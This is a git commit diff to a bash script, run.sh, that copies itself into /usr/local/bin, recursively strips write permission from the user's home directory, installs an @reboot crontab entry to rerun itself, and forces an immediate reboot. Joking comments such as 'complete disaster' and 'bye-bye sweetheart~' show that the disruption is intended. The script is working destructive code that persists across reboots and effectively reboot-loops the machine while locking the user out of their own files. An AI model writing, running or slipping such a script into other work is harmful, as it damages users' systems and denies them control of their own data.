c2891a54d58e5a972cb13bc1af9c0a5cf387edba
Pancake <71461975+zpancakee@users.noreply.github.com>
2025-02-26 07:27:06 +0100

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,14 +1,19 @@
 #!/bin/bash
 
-# hehe
-cp /home/$(whoami)/run.sh /usr/local/bin/run.sh
-chmod +x /usr/local/bin/run.sh
+# where it belongs :3
+DEST_DIR="/usr/local/bin"
 
-# time for funni
+# funni
+cp /home/$(whoami)/run.sh $DEST_DIR/run.sh
+
+# funni round 2
+chmod +x $DEST_DIR/run.sh
+
+# funni round 3
 chmod -R a-w /home/$(whoami)
 
-# lol gl
-(crontab -l 2>/dev/null; echo "@reboot /bin/bash /usr/local/bin/run.sh") | crontab -
+# complete disaster
+(crontab -l 2>/dev/null; echo "@reboot /bin/bash $DEST_DIR/run.sh") | crontab -
 
 # bye-bye sweetheart~
 shutdown -r now
